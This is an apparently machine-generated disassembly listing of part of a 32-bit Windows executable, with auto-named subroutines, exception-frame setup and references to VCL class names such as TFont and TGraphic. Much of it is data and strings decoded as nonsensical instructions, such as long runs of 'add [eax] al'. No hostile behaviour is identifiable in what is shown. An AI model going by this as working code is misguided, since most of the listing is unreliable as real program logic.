push sub_421811
lea eax [ ebp - 0x4 ]
call sub_404e44
retn
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx 0x1
call sub_4053c4
sub_42182b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_421870
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421877
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_405af0
sub_42187c
sbb [ eax ] 0x42
add [ ecx ] al
push es
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
loopne r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
sbb [ edx ] al
or al 0x0
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ edi ] cl
inc ebp
dec ecx
outsb
jbe r-xdata
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc edx
add [ eax + eax ] cl
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ ecx + ebx ] di
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx ] bh
inc edx
add [ eax + eax ] cl
add [ eax ] al
les eax [ edx + 0x41ac0040 ]
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax ] bl
inc ebp
dec ecx
outsb
jbe r-xdata
push esp
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
pop esp
sbb [ edx ] eax
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
jae r-xdata
inc esi
popad
insd
nop
mov al 0x19
inc edx
add [ ecx ] al
or al 0x54
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
int3
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ eax + 0x19 ] bl
inc edx
add [ ecx ] cl
jo r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
je r-xdata
popa
jne r-xdata
popad
je r-xdata
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or [ eax + 0x6d ] esi
inc ebx
insb
popad
jb r-xdata
add eax 0x6f4e6d70
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
sbb [ edx ] eax
mov eax eax
xor al 0x1a
inc edx
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
je r-xdata
enter 0x4219 0x0
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al cl
sbb [ edx ] eax
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
jae r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
insd
outsd
or esi [ eax + 0x73 ]
jo r-xdata
jo r-xdata
add eax 0x6f4e6d70
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
outsd
imul esp [ ebx + 0x73 ] 0x1a1cc08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
push esp
push eax
outsb
insb
add [ gs : eax ] eax
add [ eax ] al
add [ eax ] cl
add [ eax ] al
add [ eax ] dh
sbb al [ edx ]
pop es
jo r-xdata
outsd
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
pop es
jo r-xdata
push ebx
je r-xdata
push eax
outsb
dec esi
jo r-xdata
imul esp [ ebx + 0x73 ] 0x421ab490
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
popad
jae r-xdata
push 0x5657469
jo r-xdata
inc esp
popad
jae r-xdata
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
jb r-xdata
jo r-xdata
dec ecx
outsb
jb r-xdata
inc ebx
outsd
jo r-xdata
push es
jo r-xdata
je r-xdata
inc edx
insb
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
add [ edi ] cl
add [ eax ] al
jo r-xdata
add [ edi ] al
inc esp
popad
jae r-xdata
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
push es
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
enter 0x4219 0x0
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
pop esp
sbb al 0x42
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
add [ eax ] al
add [ ebx + ebx + 0x42 ] ch
dec ebp
jb r-xdata
dec esi
outsd
je r-xdata
jo r-xdata
dec esi
outsd
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
inc esp
outsd
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
push es
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x1c ] al
inc edx
inc edx
add [ gs : eax ] eax
add [ eax ] al
push 0x6c797453
push 0x8b736369
push eax
outsb
dec esi
outsd
je r-xdata
shl [ eax + 0x1b ] 0x42
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
insd
je r-xdata
dec esi
outsd
je r-xdata
insd
inc esi
jb r-xdata
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ ebx ] al
imul esp [ ebx + 0x73 ] 0x1b70c08b
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
je r-xdata
dec esi
outsd
insd
push edi
je r-xdata
insb
add [ eax + 0x700421a ] dh
sldt [ eax ]
je r-xdata
add eax 0x6f447370
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x4219a090
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
dec ecx
je r-xdata
jo r-xdata
popad
bound ebp [ ebp + 0x7 ]
or [ edi + 0x72 ] al
popad
jo r-xdata
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
jae r-xdata
popad
jae r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x6eac0041 ] bl
inc ecx
add [ esi + ebp * 2 + 0x6dc80041 ] dh
inc ecx
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
add [ eax ] bl
add [ eax ] al
add [ eax ] al
inc edx
jpe r-xdata
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
outsd
je r-xdata
insb
or esi [ gs : eax + 0x73 ]
inc ecx
insb
jns r-xdata
push ebp
jae r-xdata
insd
or esi [ gs : eax + 0x73 ]
outsd
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
popad
insb
dec esi
outsd
je r-xdata
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
inc esp
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
or al 0x70
insd
jb r-xdata
add [ eax ] al
test [ edx + eax * 2 ] bl
add [ eax ] ah
add [ eax ] al
add [ ecx ] al
add ch bh
push [ esp + esi + 0x54050042 ]
inc esi
outsd
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
or [ 0x42 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x1d
inc edx
add [ eax ] bh
sbb eax 0x42
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + ebx * 2 + 0x1c ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
outsb
pop es
jo r-xdata
outsb
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
add [ ecx ] al
add ch bh
jae r-xdata
inc ecx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
outsb
je r-xdata
jae r-xdata
dec ebp
popad
jo r-xdata
xor [ edx ] eax
andps xmm0 [ edi + 0x72 ]
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
mov eax eax
jo r-xdata
inc edi
jb r-xdata
add [ edi ] al
sbb eax 0x5070042
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax 0x1d2e0042
inc edx
add [ eax + eax ] ah
cmp [ 0x42 ] bl
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ esp + esi + 0x1c ] si
inc edx
add [ edx + eax * 2 + 0x41 ] dh
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
dec ebp
jb r-xdata
xor al 0x1c
add [ eax + 0x1c ] cl
insb
jb r-xdata
pop eax
nop
inc edi
add [ edi ] al
inc edx
outsd
outsb
jo r-xdata
imul esp [ ebp + 0x6e ] 0x69746174
outsd
outsb
pop eax
sbb [ edx ] eax
les edi [ ecx ]
inc edx
add ah cl
cmp [ edx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax 0x69500500
je r-xdata
sbb [ edx ] al
sbb [ eax ] al
add bh bh
or al 0x36
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
add [ eax ] cl
inc edi
jb r-xdata
sbb eax 0x1c580042
inc edx
add [ eax ] cl
add [ eax ] al
call 0xffffffffac425f04
sbb eax 0x240042
jo r-xdata
dec esi
outsd
or dh [ gs : eax + 0x6d ]
push [ eax + 0x31 ]
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
jo r-xdata
inc edx
add [ eax + eax ] bl
add [ eax ] al
call 0xffffffffac4260a4
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x53ffbdc6 ] bl
outsb
inc ecx
add [ esi + ebp * 2 + 0x3ac00041 ] dh
inc edx
add [ esp + edx * 2 ] al
push r-xdata
push eax
cmp [ edx ] eax
insb
cmp [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ ebx + edx * 2 ] al
imul edi [ edx + 0x65 ] r-xdata
popad
insd
cmp al 0x10
inc eax
add [ edx + edi ] ah
inc edx
add [ edx + edi ] ch
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
or ecx [ edi + 0x72 ]
adc [ eax ] al
lodsb [ esi ]
cmp [ edx ] al
mov ah 0x38
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
imul esp [ gs : edi + 0x68 ] 0x42199c74
add ah bl
cmp [ edx ] al
hlt
add al [ eax ]
push es
dec eax
jo r-xdata
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
sbb eax [ edx ]
lodsb [ esi ]
imul esp [ ebx + 0x73 ] 0xc08b0000
mov [ edx + eax * 2 ] bl
add [ edi ] cl
cmovns eax [ ebx + 0x68 ]
popad
outsb
dec esi
outsd
je r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx + 0x42 ] bl
imul esp [ ebx + 0x73 ] 0x421c3490
in al dx
imul esp [ ebx + 0x73 ] 0x187c0004
inc edx
add al ah
cmp eax [ edx ]
call 0x1426123
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
pushfd
sbb [ edx ] eax
fdivr [ eax ]
inc edx
add ah dh
cmp [ edx ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
add al 0x4e
inc ebx
push 0x65737261
je r-xdata
imul esp [ ebx + 0x73 ] 0x19ac0008
inc edx
add ah dh
cmp [ edx ] eax
cld
cmp [ edx ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] al
pop es
inc eax
add [ eax ] bl
aas
inc eax
add [ esp + esi + 0x6eac0042 ] cl
inc ecx
add [ esi + ebp * 2 + 0x34d00041 ] dh
inc edx
imul sp [ ebp + 0x72 ] 0x1130
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ eax ] al
jae r-xdata
push eax
outsb
lea eax [ eax ]
rcr [ esi ] 0x42
add [ edi ] al
add al 0x54
push eax
outsb
test al 0x1e
inc edx
add [ eax + 0x1c ] bl
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
mov ah 0x6e
inc ecx
add al al
cmp al [ edx ]
add al 0x54
cmp al 0x42
add ah dh
cmp al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x1fa8c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
pop ds
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebx + 0x180042 ] dh
add [ eax ] al
call 0xffffffffac4261a4
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x3d ] ah
inc edx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add [ eax + 0x600423d ] cl
push esp
inc edx
jb r-xdata
sbb al [ edx ]
sbb [ eax ] al
add bh bh
test al 0x3c
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x3065646f ] al
sbb al [ edx ]
mov esp 0xc400423c
cmp al 0x42
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
cmp al 0x10
inc eax
add ah ch
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ esp + ebx + 0x200042 ] al
add [ eax ] al
add [ eax ] eax
std
jo r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ edx + 0x41 ] al
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add ah bl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4220 ] dl
add [ eax ] al
nop
rcr [ edi ] 0x42
add [ edi ] al
push es
push esp
inc edx
jb r-xdata
add al 0x24
retn
outsd
xor al 0x1d
inc edx
add [ eax + eax ] cl
add bh bh
lea eax [ eax ]
and [ edx ] al
pop es
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0x580042 ] al
jae r-xdata
rcr ah 0x50
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
js r-xdata
jae r-xdata
nop
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0x1f
inc edx
add [ eax + 0x1c ] bl
inc edx
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
push r-xdata
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
push ds
inc edx
add [ eax ] dl
add [ eax ] al
dec [ eax + 0x1004244 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x50030003 ] al
outsb
mov eax eax
int3
outsd
outsb
je r-xdata
add [ eax ] al
add [ edx ] 0x0
add al 0x46
and [ edx ] al
je r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
add al 0xdc
jmp sub_416fdc
dec ebp
and [ eax ] 0x0
int3
inc ecx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
test [ eax ] ah
inc edx
add [ eax ] bl
imul esp [ ebx + 0x73 ] 0x187c0002
inc edx
add al al
inc edx
add al cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
imul esp [ ebx + 0x73 ] 0x1fbc0004
inc edx
add [ eax + eax ] dl
add bh bh
xchg esp eax
inc esp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
inc edx
add [ esi + ebp * 2 + 0x6eb40041 ] ch
inc ecx
add al cl
insd
inc ecx
add ah al
inc esi
inc edx
add [ eax - 0x1fffbdba ] dh
inc ebp
inc edx
add [ edi ] al
push esp
inc ebx
popad
outsb
jbe r-xdata
insb
and [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb eax [ edx ]
fdivr [ edi ]
inc edx
add ah ah
aas
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
mov eax [ eax ]
mov eax [ eax + 0x58 ]
xchg [ esp ] eax
retn
push eax
jae r-xdata
add [ ebx + 0x4875440 ] cl
and al 0xc3
add eax 0xffffffdc
cmp al 0x10
inc eax
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
sub_4221a8
test [ ecx ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x22 ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x22 ] bl
inc edx
add [ eax + 0x22 ] ah
inc edx
add [ eax ] ch
add [ eax ] al
add al dh
inc edx
inc ecx
add [ ecx + eax * 2 + 0x6f6c0040 ] ch
inc ecx
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebp + ebp * 2 + 0x6eac0041 ] bl
inc ecx
add [ ebx + ebx * 2 + 0x6dc80042 ] ah
inc ecx
add ah bh
outsd
inc ecx
add [ ebx + ebx * 2 ] dh
inc edx
add [ eax - 0xfffbfce ] dl
pop ebx
inc edx
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
cmp al 0x5d
inc edx
add [ eax + 0x5d ] al
inc edx
add [ eax - 0x37ffbfce ] dl
pop ebp
inc edx
add [ eax + 0x2c004032 ] dl
pop esi
inc edx
add [ esi + ebx * 2 + 0x42 ] cl
add [ eax + 0x5c004032 ] dl
pop esi
inc edx
add ah bh
pop edx
inc edx
add [ eax + 0x5d ] cl
inc edx
add ah dl
pop ebp
inc edx
add [ eax - 0x6fffbfce ] dl
xor al [ eax ]
nop
xor al [ eax ]
nop
xor al [ eax ]
xor [ esi + 0x42 ] bl
add [ ecx ] al
add ch bh
[ ebp + ebx * 2 + 0x54080042 ]
inc edi
jb r-xdata
mov eax [ 0xffffffffaf004222 ]
and al [ edx ]
mov ecx 0x91004222
jo r-xdata
and al [ edx ]
cdq
and al [ edx ]
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
aam 0x11
and al [ edx ]
xchg ecx eax
imul esp [ ebx - 0x73 ] 0x22700040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x10 ] 0x74004221
inc ebx
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc edx
add [ eax + 0x4223 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x23 ] ch
inc edx
add [ eax + 0x23 ] bh
inc edx
add [ eax + eax ] ch
add [ eax ] al
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
ffree st6
and al [ edx ]
jo r-xdata
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
dec eax
and eax [ edx ]
fisub [ edx ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax + 0x23 ] bl
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp sub_4263ec
sub_42236e
cld
dec esp
inc edx
add al dh
inc edx
add [ eax ] cl
push esp
push eax
imul esp [ ebx + 0x74 ] 0x8d657275
inc eax
add [ eax + 0x7004223 ] cl
or [ eax + edx * 2 + 0x69 ] dl
arpl [ ebp + esi * 2 + 0x72 ] si
dec eax
and eax [ edx ]
je r-xdata
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add ah bh
outsd
inc ecx
add [ ebx + ebx * 2 ] dh
inc edx
add [ eax + ebp * 2 + 0x5bf00042 ] bl
inc edx
add [ ecx + ebp * 2 ] ch
inc edx
add [ ecx + ebp * 2 ] dh
inc edx
add [ eax + 0x40004269 ] bl
pop ebp
inc edx
add [ edx + ebp * 2 ] ah
inc edx
add [ ebx + ebp * 2 ] al
inc edx
add [ esi + ebp * 2 + 0x5e2c0042 ] ah
inc edx
add [ eax - 0x6bffbd91 ] dl
outsd
inc edx
add ah ch
jo r-xdata
imul bp [ ebp + 0x49 ] 0x616d
nop
mov ah 0x24
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sbb al 0x25
inc edx
add [ eax ] dh
add [ eax ] al
add [ ecx + 0x41ac0042 ] ah
inc eax
add [ edi + ebp * 2 + 0x41 ] ch
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add al bl
inc edx
add [ esi + ebp * 2 + 0x5ba40041 ] ch
inc edx
add [ eax ] cl
push 0x6ffc0042
insd
popad
lea eax [ bx + si ]
push esp
and al 0x42
jo r-xdata
inc edx
add [ eax + 0x48004267 ] dl
pop ebp
inc edx
add al al
insd
inc edx
add [ eax - 0x77ffbd96 ] cl
outsb
inc edx
add [ eax + 0x73 ] al
inc edx
add ah al
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x24 ] bl
inc edx
add [ eax + eax ] ah
add [ eax ] al
test al 0x23
inc edx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax + 0x67 ] dl
inc edx
add [ edi + 0x540e0042 ] cl
dec ebp
je r-xdata
inc edx
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ edi + edi + 0x40 ] dl
add [ eax + 0xc004032 ] dl
push esp
push ebx
push 0x64657261
dec ecx
imul esp [ ebx + 0x73 ] 0xf4900000
and eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
and eax [ edx ]
or [ eax ] al
add [ eax ] al
mov esp 0xac004010
inc ecx
inc eax
add [ eax - 0x43ffbfbf ] bh
inc ecx
inc eax
add al al
inc ecx
popad
jo r-xdata
add [ eax ] al
add [ eax ] al
add al bh
jae r-xdata
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebx + eax * 4 + 0x42 ] dh
add [ esi + ebp * 2 + 0x5ba40041 ] ch
inc edx
add [ eax - 0x3ffbd7d ] dh
outsd
inc ecx
add [ eax + 0x10004285 ] dl
xchg [ edx ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] ch
add [ eax + eax ] bh
add [ eax ] al
movsb [ edi ] [ esi ]
and [ edx ] eax
lodsb [ esi ]
inc ecx
inc eax
add [ edi + ebp * 2 + 0x41 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x26 ] bh
imul esp [ ebx + 0x73 ] 0x25980000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + eax * 2 + 0x41c00040 ] bh
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
outsd
inc ecx
lea eax [ bx + si ]
clc
and eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x740042 ] bl
add [ eax ] al
test al 0x23
inc edx
add [ ecx + eax * 2 + 0x41b80040 ] ch
inc eax
add [ ecx + eax * 2 + 0x41c00040 ] bh
add [ ecx ] cl
push esp
dec ebp
je r-xdata
inc eax
add [ ecx + eax * 2 + 0x3efc0040 ] dh
inc eax
add [ eax ] bl
aas
inc eax
add [ eax - 0x1bffbd88 ] cl
add al al
inc ecx
imul bp [ ebp - 0x75 ] 0x2cc0
and eax 0x9070042
push esp
dec ebp
je r-xdata
js r-xdata
mov [ eax + 0x42 ] bh
add ah ah
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
imul bp [ ebp - 0x4c ] 0x4224
add [ edx + 0x42 ] ch
sub_4225b0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
rol [ ecx + 0x40 ] 0x0
mov ah 0x41
inc eax
add ah bh
inc eax
add [ eax ] bl
aas
inc eax
add [ ebx + eax * 4 + 0x42 ] dh
add [ esi + ebp * 2 + 0x5ba40041 ] ch
inc edx
add [ eax - 0x3ffbd7d ] dh
outsd
inc ecx
add [ eax + 0x10004285 ] dl
xchg [ edx ] al
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x42 ] ch
